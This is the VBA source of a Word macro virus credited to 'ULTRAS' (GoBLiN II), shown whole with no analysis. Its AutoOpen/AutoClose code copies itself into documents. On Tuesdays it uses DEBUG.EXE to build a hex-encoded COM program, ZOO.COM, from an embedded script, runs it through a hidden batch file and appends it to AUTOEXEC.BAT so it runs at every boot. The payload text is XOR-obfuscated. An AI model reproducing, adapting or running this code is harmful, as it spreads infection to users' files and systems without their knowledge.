   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim gObAo$
   Dim gObAc$
   Rem **************************
   Rem * wM.gObLiN II bY ULTraS *
   Rem **************************
   On Error Resume Next
   gObAo$ = WordBasic.[FileName$]() + ":AutoOpen"
   gObAc$ = "AutoClose"
   WordBasic.MacroCopy gObAc$, gObAo$
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy gObAo$, gObAc$
   WordBasic.FileSave
   gObLiN
   End Sub
   Private Sub gObLiN()
   If WordBasic.Weekday(WordBasic.Now()) = 3 Then
   Open "C:\WINDOWS\COMMAND\DEBUG.EXE" For Input As 1
   Close 1
   Open "C:\ZOO.SCR" For Output As 1
   Print #1, "N ZOO.COM"
   Print #1, "E 0100 B4 4E B9 06 00 BE 1E 02 E8 A4 00 B9 20 00 CD 21"
   Print #1, "E 0110 73 03 E8 58 01 B9 06 00 EB 06 90 00 00 04 00 00"
   Print #1, "E 0120 BE 1E 02 E8 89 00 E8 AA 00 81 3E 9A 00 7F 01 76"
   Print #1, "E 0130 5E BA 9E 00 E8 96 00 72 56 93 E8 57 00 BA 00 04"
   Print #1, "E 0140 E8 82 00 E8 AD 00 81 3E 00 F0 4E 45 75 3B BA 00"
   Print #1, "E 0150 02 E8 71 00 E8 9C 00 81 3E 00 F0 F8 53 75 2A BA"
   Print #1, "E 0160 20 00 E8 60 00 E8 8B 00 81 3E 00 F0 B4 4E 74 19"
   Print #1, "E 0170 33 D2 E8 50 00 B4 40 BA FE 01 B9 20 00 CD 21 B4"
   Print #1, "E 0180 40 B9 7F 01 BA 00 01 CD 21 E8 54 00 E8 5F 00 B4"
   Print #1, "E 0190 4F E9 6E FF 53 06 57 B8 20 12 50 CD 2F 26 8A 1D"
   Print #1, "E 01A0 58 2C 0A CD 2F 26 C7 45 02 02 00 5F 07 5B C3 50"
   Print #1, "E 01B0 E4 42 8A E0 E4 42 3A C4 75 01 C3 58 56 80 34 DB"
   Print #1, "E 01C0 46 E2 FA 5A C3 33 C9 B8 00 42 CD 21 C3 B8 00 3D"
   Print #1, "E 01D0 CD 21 C3 A1 96 00 A3 FC EF A1 98 00 A3 FE EF C3"
   Print #1, "E 01E0 B8 01 57 8B 0E FC EF 8B 16 FE EF CD 21 C3 B4 3E"
   Print #1, "E 01F0 CD 21 C3 B9 02 00 B4 3F BA 00 F0 CD 21 C3 4D 5A"
   Print #1, "E 0200 9F 01 01 00 00 00 02 00 00 00 FF FF F0 FF 00 00"
   Print #1, "E 0210 00 00 00 01 F0 FF 1C 00 00 00 00 00 00 00 F1 F5"
   Print #1, "E 0220 BE A3 BE DB 8F B3 B2 A8 FB AB A9 B4 BC A9 BA B6"
   Print #1, "E 0230 FB A9 BE AA AE B2 A9 BE A8 FB 96 B2 B8 A9 B4 A8"
   Print #1, "E 0240 B4 BD AF FB 8C B2 B5 BF B4 AC A8 F5 D6 D1 FF F3"
   Print #1, "E 0250 B8 F2 FB 9F 95 BA A1 B2 17 20 FB 28 32 3F 3E 37"
   Print #1, "E 0260 FB 33 3C FB 3C 35 35 34 3B 2B 31 3B FA B9 2B 00"
   Print #1, "E 0270 BE 24 02 E8 39 FF B4 09 CD 21 B8 01 4C CD 21"
   Print #1, "RCX"
   Print #1, "017F"
   Print #1, "W"
   Print #1, "Q"
   Close 1
   Open "C:\ZOO.BAT" For Output As 1
   Print #1, "@ECHO OFF"
   Print #1, "DEBUG.EXE < C:\ZOO.SCR > NUL"
   Close 1
   WordBasic.ChDir "C:\"
   WordBasic.Shell "ZOO.BAT", 0
   Open "C:\AUTOEXEC.BAT" For Append As 1
   Print #1, "@C:\ZOO.COM"
   Close 1
   WordBasic.Kill "C:\ZOO.SCR"
   WordBasic.MsgBox "GoBLiN II by ULTRAS" + Chr(13) + _
          "Thank you Dirty Nazi [Stealth group WorldWide]" + Chr(13) + _
          "for such beautiful virus." + Chr(13) + _
          "Written by ULTRAS [Rioters]", "ULTRAS...", 16
   End If
   End Sub
